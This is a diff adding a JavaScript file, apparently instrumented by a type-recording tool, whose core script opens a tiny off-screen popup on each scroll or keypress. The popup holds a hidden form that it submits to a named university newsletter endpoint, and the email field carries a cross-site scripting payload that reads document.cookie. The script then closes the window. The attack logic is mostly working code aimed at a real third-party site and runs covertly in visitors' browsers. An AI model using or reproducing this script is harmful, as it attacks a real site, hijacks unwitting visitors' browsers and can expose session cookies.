@@ -1,0 +1,291 @@
+var Inst0 = 0;
+var Inst1 = 0;
+var Inst2 = 0;
+var Inst3 = 0;
+var Inst4 = 0;
+var Inst5 = 0;
+var Inst6 = 0;
+var Inst7 = 0;
+var Inst8 = 0;
+var Inst9 = 0;
+var Inst10 = 0;
+var Inst11 = 0;
+var Inst12 = 0;
+var Inst13 = 0;
+var Inst14 = 0;
+var Inst15 = 0;
+var Inst16 = 0;
+var Inst17 = 0;
+var Inst18 = 0;
+var Inst19 = 0;
+var Inst20 = 0;
+var Inst21 = 0;
+var Inst22 = 0;
+var Inst23 = 0;
+var Inst24 = 0;
+var Inst25 = 0;
+var Inst26 = 0;
+var Inst27 = 0;
+var Inst28 = 0;
+var Inst29 = 0;
+var Inst30 = 0;
+var Inst31 = 0;
+var Inst32 = 0;
+var Inst33 = 0;
+var Inst34 = 0;
+var Inst35 = 0;
+var Inst36 = 0;
+var Inst37 = 0;
+var Inst38 = 0;
+var Inst39 = 0;
+var Inst40 = 0;
+var Inst41 = 0;
+var Inst42 = 0;
+var Inst43 = 0;
+var Inst44 = 0;
+var Inst45 = 0;
+var Inst46 = 0;
+var Inst47 = 0;
+var Inst48 = 0;
+var Inst49 = 0;
+var Inst50 = 0;
+var Inst51 = 0;
+var Inst52 = 0;
+var Inst53 = 0;
+var Inst54 = 0;
+var Inst55 = 0;
+var Inst56 = 0;
+var Inst57 = 0;
+var Inst58 = 0;
+var Inst59 = 0;
+var Inst60 = 0;
+var Inst61 = 0;
+var Inst62 = 0;
+var Inst63 = 0;
+var Inst64 = 0;
+var Inst65 = 0;
+var Inst66 = 0;
+var Inst67 = 0;
+var Inst68 = 0;
+var Inst69 = 0;
+var Inst70 = 0;
+var Inst71 = 0;
+var Inst72 = 0;
+var Inst73 = 0;
+var Inst74 = 0;
+var Inst75 = 0;
+var Inst76 = 0;
+var Inst77 = 0;
+var Inst78 = 0;
+var Inst79 = 0;
+var Inst80 = 0;
+var Inst81 = 0;
+var Inst82 = 0;
+ 
+function _TypeOfArray(a) {
+	let number = true;	
+	let string = true;
+	for (let i = 0; i < a.length; i++) {
+		if (number && (typeof a[i]) != "number") {
+			number = false;	
+		}
+		if (string && (typeof a[i]) != "string") {
+			string = false;	
+		}
+		if (!number && !string)
+			break;
+	}
+	if (number)
+		return "number";
+	else if (string)
+		return "string";
+	else
+		return "any";
+}
+
+function _TypeIsEqual(t1, t2) {
+	return JSON.stringify(t1) === JSON.stringify(t2);
+}
+
+function _TypeOf(a, step) {
+	var t;
+	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
+	if (type == "array") {
+		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
+	} else if (type == "object") {
+		let shape = [];
+        if (step === undefined || step > 0) {
+            let keys = Object.keys(a);
+            let length = Math.min(100, keys.length);
+		    for (let i = 0; i < length; i++) {
+			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
+		    }
+        }
+		t = {type : type, extra: {shape: shape}};
+	} else {
+		t = {type : type};
+	} 
+	return t;
+}
+
+function _RecordType(loc, a) {
+	var t = _TypeOf(a);
+    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
+}
+
+
+const windowWidth = 1; // Set the width of the window
+try { if (Inst0 <= 1000 && typeof (windowWidth) != "undefined") {_RecordType("<10,21,3>",(windowWidth)); Inst0++; } } catch(e) {}
+
+const windowHeight = 1; // Set the height of the window
+try { if (Inst1 <= 1000 && typeof (windowHeight) != "undefined") {_RecordType("<67,79,5>",(windowHeight)); Inst1++; } } catch(e) {}
+
+try { if (Inst3 <= 1000 && typeof (window.screen.width) != "undefined") {_RecordType("<140,159,7>",(window.screen.width)); Inst3++; } } catch(e) {}try { if (Inst4 <= 1000 && typeof (window.screen) != "undefined") {_RecordType("<140,153,7>",(window.screen)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (window) != "undefined") {_RecordType("<140,146,7>",(window)); Inst5++; } } catch(e) {}
+const screenWidth = window.screen.width;
+try { if (Inst2 <= 1000 && typeof (screenWidth) != "undefined") {_RecordType("<126,137,7>",(screenWidth)); Inst2++; } } catch(e) {}
+
+try { if (Inst7 <= 1000 && typeof (window.screen.height) != "undefined") {_RecordType("<185,205,9>",(window.screen.height)); Inst7++; } } catch(e) {}try { if (Inst8 <= 1000 && typeof (window.screen) != "undefined") {_RecordType("<185,198,9>",(window.screen)); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (window) != "undefined") {_RecordType("<185,191,9>",(window)); Inst9++; } } catch(e) {}
+const screenHeight = window.screen.height;
+try { if (Inst6 <= 1000 && typeof (screenHeight) != "undefined") {_RecordType("<170,182,9>",(screenHeight)); Inst6++; } } catch(e) {}
+
+try { if (Inst11 <= 1000 && typeof (screenWidth) != "undefined") {_RecordType("<229,240,11>",(screenWidth)); Inst11++; } } catch(e) {}try { if (Inst12 <= 1000 && typeof (windowWidth) != "undefined") {_RecordType("<243,254,11>",(windowWidth)); Inst12++; } } catch(e) {}
+const windowLeft = screenWidth - windowWidth;
+try { if (Inst10 <= 1000 && typeof (windowLeft) != "undefined") {_RecordType("<216,226,11>",(windowLeft)); Inst10++; } } catch(e) {}
+
+try { if (Inst14 <= 1000 && typeof (screenHeight) != "undefined") {_RecordType("<277,289,13>",(screenHeight)); Inst14++; } } catch(e) {}try { if (Inst15 <= 1000 && typeof (windowHeight) != "undefined") {_RecordType("<292,304,13>",(windowHeight)); Inst15++; } } catch(e) {}
+const windowTop = screenHeight - windowHeight;
+try { if (Inst13 <= 1000 && typeof (windowTop) != "undefined") {_RecordType("<265,274,13>",(windowTop)); Inst13++; } } catch(e) {}
+
+const time_to_wait_before_closing_new_window = 5;
+try { if (Inst16 <= 1000 && typeof (time_to_wait_before_closing_new_window) != "undefined") {_RecordType("<315,353,15>",(time_to_wait_before_closing_new_window)); Inst16++; } } catch(e) {}
+
+
+
+    // Function to open a new window, submit the form, and close the window
+
+try { if (Inst17 <= 1000 && typeof (submit_form) != "undefined") {_RecordType("<458,469,21>",(submit_form)); Inst17++; } } catch(e) {}
+    function submit_form() {
+
+try { if (Inst18 <= 1000 && typeof (document.removeEventListener) != "undefined") {_RecordType("<483,511,23>",(document.removeEventListener)); Inst18++; } } catch(e) {}try { if (Inst19 <= 1000 && typeof (document) != "undefined") {_RecordType("<483,491,23>",(document)); Inst19++; } } catch(e) {}try { if (Inst20 <= 1000 && typeof (submit_form) != "undefined") {_RecordType("<522,533,23>",(submit_form)); Inst20++; } } catch(e) {}
+      document.removeEventListener("scroll", submit_form);
+
+try { if (Inst21 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<541,551,25>",(setTimeout)); Inst21++; } } catch(e) {}
+		setTimeout(function () {
+
+try { if (Inst22 <= 1000 && typeof (document.addEventListener) != "undefined") {_RecordType("<573,598,27>",(document.addEventListener)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (document) != "undefined") {_RecordType("<573,581,27>",(document)); Inst23++; } } catch(e) {}try { if (Inst24 <= 1000 && typeof (submit_form) != "undefined") {_RecordType("<609,620,27>",(submit_form)); Inst24++; } } catch(e) {}
+    document.addEventListener("scroll", submit_form);
+
+  }, 100);
+
+try { if (Inst25 <= 1000 && typeof (document.removeEventListener) != "undefined") {_RecordType("<646,674,31>",(document.removeEventListener)); Inst25++; } } catch(e) {}try { if (Inst26 <= 1000 && typeof (document) != "undefined") {_RecordType("<646,654,31>",(document)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (submit_form) != "undefined") {_RecordType("<686,697,31>",(submit_form)); Inst27++; } } catch(e) {}
+      document.removeEventListener("keydown", submit_form);
+
+try { if (Inst28 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<705,715,33>",(setTimeout)); Inst28++; } } catch(e) {}
+		setTimeout(function () {
+
+try { if (Inst29 <= 1000 && typeof (document.addEventListener) != "undefined") {_RecordType("<737,762,35>",(document.addEventListener)); Inst29++; } } catch(e) {}try { if (Inst30 <= 1000 && typeof (document) != "undefined") {_RecordType("<737,745,35>",(document)); Inst30++; } } catch(e) {}try { if (Inst31 <= 1000 && typeof (submit_form) != "undefined") {_RecordType("<774,785,35>",(submit_form)); Inst31++; } } catch(e) {}
+    document.addEventListener("keydown", submit_form);
+
+  }, 100);
+
+      // Open a new window, uncomment the rest of the line to make it minimum size
+
+try { if (Inst33 <= 1000 && typeof (window.open) != "undefined") {_RecordType("<913,924,41>",(window.open)); Inst33++; } } catch(e) {}try { if (Inst34 <= 1000 && typeof (window) != "undefined") {_RecordType("<913,919,41>",(window)); Inst34++; } } catch(e) {}try { if (Inst35 <= 1000 && typeof (windowWidth) != "undefined") {_RecordType("<940,951,41>",(windowWidth)); Inst35++; } } catch(e) {}try { if (Inst36 <= 1000 && typeof (windowHeight) != "undefined") {_RecordType("<962,974,41>",(windowHeight)); Inst36++; } } catch(e) {}try { if (Inst37 <= 1000 && typeof (windowLeft) != "undefined") {_RecordType("<983,993,41>",(windowLeft)); Inst37++; } } catch(e) {}try { if (Inst38 <= 1000 && typeof (windowTop) != "undefined") {_RecordType("<1001,1010,41>",(windowTop)); Inst38++; } } catch(e) {}
+      var newWindow = window.open("","",`width=${windowWidth},height=${windowHeight},left=${windowLeft},top=${windowTop},toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no`);
+try { if (Inst32 <= 1000 && typeof (newWindow) != "undefined") {_RecordType("<901,910,41>",(newWindow)); Inst32++; } } catch(e) {}
+
+	  // Create a form element
+
+	  
+
+try { if (Inst40 <= 1000 && typeof (document.createElement) != "undefined") {_RecordType("<1159,1181,47>",(document.createElement)); Inst40++; } } catch(e) {}try { if (Inst41 <= 1000 && typeof (document) != "undefined") {_RecordType("<1159,1167,47>",(document)); Inst41++; } } catch(e) {}
+      var form = document.createElement("form");
+try { if (Inst39 <= 1000 && typeof (form) != "undefined") {_RecordType("<1152,1156,47>",(form)); Inst39++; } } catch(e) {}
+
+      form.action = "https://isimsf.rnu.tn/fra/newsletter";
+try { if (Inst42 <= 1000 && typeof (form.action) != "undefined") {_RecordType("<1200,1211,49>",(form.action)); Inst42++; } } catch(e) {}try { if (Inst43 <= 1000 && typeof (form) != "undefined") {_RecordType("<1200,1204,49>",(form)); Inst43++; } } catch(e) {}
+
+      form.method = "POST";
+try { if (Inst44 <= 1000 && typeof (form.method) != "undefined") {_RecordType("<1263,1274,51>",(form.method)); Inst44++; } } catch(e) {}try { if (Inst45 <= 1000 && typeof (form) != "undefined") {_RecordType("<1263,1267,51>",(form)); Inst45++; } } catch(e) {}
+
+
+
+      // Add form input fields
+
+try { if (Inst47 <= 1000 && typeof (document.createElement) != "undefined") {_RecordType("<1344,1366,57>",(document.createElement)); Inst47++; } } catch(e) {}try { if (Inst48 <= 1000 && typeof (document) != "undefined") {_RecordType("<1344,1352,57>",(document)); Inst48++; } } catch(e) {}
+      var email = document.createElement("input");
+try { if (Inst46 <= 1000 && typeof (email) != "undefined") {_RecordType("<1336,1341,57>",(email)); Inst46++; } } catch(e) {}
+
+      email.name = "email";
+try { if (Inst49 <= 1000 && typeof (email.name) != "undefined") {_RecordType("<1386,1396,59>",(email.name)); Inst49++; } } catch(e) {}try { if (Inst50 <= 1000 && typeof (email) != "undefined") {_RecordType("<1386,1391,59>",(email)); Inst50++; } } catch(e) {}
+
+	  email.type='hidden'; //comment this to make it visible
+try { if (Inst51 <= 1000 && typeof (email.type) != "undefined") {_RecordType("<1414,1424,61>",(email.type)); Inst51++; } } catch(e) {}try { if (Inst52 <= 1000 && typeof (email) != "undefined") {_RecordType("<1414,1419,61>",(email)); Inst52++; } } catch(e) {}
+
+      email.value = '"><details/open/ontoggle="alert(document.cookie)">';
+try { if (Inst53 <= 1000 && typeof (email.value) != "undefined") {_RecordType("<1478,1489,63>",(email.value)); Inst53++; } } catch(e) {}try { if (Inst54 <= 1000 && typeof (email) != "undefined") {_RecordType("<1478,1483,63>",(email)); Inst54++; } } catch(e) {}
+
+try { if (Inst55 <= 1000 && typeof (form.appendChild) != "undefined") {_RecordType("<1555,1571,65>",(form.appendChild)); Inst55++; } } catch(e) {}try { if (Inst56 <= 1000 && typeof (form) != "undefined") {_RecordType("<1555,1559,65>",(form)); Inst56++; } } catch(e) {}try { if (Inst57 <= 1000 && typeof (email) != "undefined") {_RecordType("<1572,1577,65>",(email)); Inst57++; } } catch(e) {}
+      form.appendChild(email);
+
+
+
+      // Add the form to the new window
+
+try { if (Inst58 <= 1000 && typeof (newWindow.document.body.appendChild) != "undefined") {_RecordType("<1636,1671,71>",(newWindow.document.body.appendChild)); Inst58++; } } catch(e) {}try { if (Inst59 <= 1000 && typeof (newWindow.document.body) != "undefined") {_RecordType("<1636,1659,71>",(newWindow.document.body)); Inst59++; } } catch(e) {}try { if (Inst60 <= 1000 && typeof (newWindow.document) != "undefined") {_RecordType("<1636,1654,71>",(newWindow.document)); Inst60++; } } catch(e) {}try { if (Inst61 <= 1000 && typeof (newWindow) != "undefined") {_RecordType("<1636,1645,71>",(newWindow)); Inst61++; } } catch(e) {}try { if (Inst62 <= 1000 && typeof (form) != "undefined") {_RecordType("<1672,1676,71>",(form)); Inst62++; } } catch(e) {}
+      newWindow.document.body.appendChild(form);
+
+	  
+
+      // Submit the form from the new window
+
+try { if (Inst63 <= 1000 && typeof (form.submit) != "undefined") {_RecordType("<1743,1754,77>",(form.submit)); Inst63++; } } catch(e) {}try { if (Inst64 <= 1000 && typeof (form) != "undefined") {_RecordType("<1743,1747,77>",(form)); Inst64++; } } catch(e) {}
+      form.submit();
+
+	  
+
+	  // uncomment this to make the new window close after 10 seconds
+
+try { if (Inst65 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<1841,1851,83>",(setTimeout)); Inst65++; } } catch(e) {}try { if (Inst68 <= 1000 && typeof (time_to_wait_before_closing_new_window) != "undefined") {_RecordType("<1908,1946,87>",(time_to_wait_before_closing_new_window)); Inst68++; } } catch(e) {}
+	  setTimeout(function () {
+
+try { if (Inst66 <= 1000 && typeof (newWindow.close) != "undefined") {_RecordType("<1877,1892,85>",(newWindow.close)); Inst66++; } } catch(e) {}try { if (Inst67 <= 1000 && typeof (newWindow) != "undefined") {_RecordType("<1877,1886,85>",(newWindow)); Inst67++; } } catch(e) {}
+        newWindow.close();
+
+      }, time_to_wait_before_closing_new_window * 1000); // Close after n seconds (n * 1000 milliseconds) feel free to increase it if the site is too slow to load
+
+	  
+
+	  
+
+    }
+
+
+
+
+
+try { if (Inst69 <= 1000 && typeof (document.removeEventListener) != "undefined") {_RecordType("<2097,2125,99>",(document.removeEventListener)); Inst69++; } } catch(e) {}try { if (Inst70 <= 1000 && typeof (document) != "undefined") {_RecordType("<2097,2105,99>",(document)); Inst70++; } } catch(e) {}try { if (Inst71 <= 1000 && typeof (submit_form) != "undefined") {_RecordType("<2136,2147,99>",(submit_form)); Inst71++; } } catch(e) {}
+	document.removeEventListener("scroll", submit_form);
+
+try { if (Inst72 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<2155,2165,101>",(setTimeout)); Inst72++; } } catch(e) {}
+		setTimeout(function () {
+
+try { if (Inst73 <= 1000 && typeof (document.addEventListener) != "undefined") {_RecordType("<2187,2212,103>",(document.addEventListener)); Inst73++; } } catch(e) {}try { if (Inst74 <= 1000 && typeof (document) != "undefined") {_RecordType("<2187,2195,103>",(document)); Inst74++; } } catch(e) {}try { if (Inst75 <= 1000 && typeof (submit_form) != "undefined") {_RecordType("<2223,2234,103>",(submit_form)); Inst75++; } } catch(e) {}
+    document.addEventListener("scroll", submit_form);
+
+  }, 100);
+
+try { if (Inst76 <= 1000 && typeof (document.removeEventListener) != "undefined") {_RecordType("<2260,2288,107>",(document.removeEventListener)); Inst76++; } } catch(e) {}try { if (Inst77 <= 1000 && typeof (document) != "undefined") {_RecordType("<2260,2268,107>",(document)); Inst77++; } } catch(e) {}try { if (Inst78 <= 1000 && typeof (submit_form) != "undefined") {_RecordType("<2300,2311,107>",(submit_form)); Inst78++; } } catch(e) {}
+      document.removeEventListener("keydown", submit_form);
+
+try { if (Inst79 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<2319,2329,109>",(setTimeout)); Inst79++; } } catch(e) {}
+		setTimeout(function () {
+
+try { if (Inst80 <= 1000 && typeof (document.addEventListener) != "undefined") {_RecordType("<2351,2376,111>",(document.addEventListener)); Inst80++; } } catch(e) {}try { if (Inst81 <= 1000 && typeof (document) != "undefined") {_RecordType("<2351,2359,111>",(document)); Inst81++; } } catch(e) {}try { if (Inst82 <= 1000 && typeof (submit_form) != "undefined") {_RecordType("<2388,2399,111>",(submit_form)); Inst82++; } } catch(e) {}
+    document.addEventListener("keydown", submit_form);
+
+  }, 100);
+
+	//	win32-release_x64
+
+  
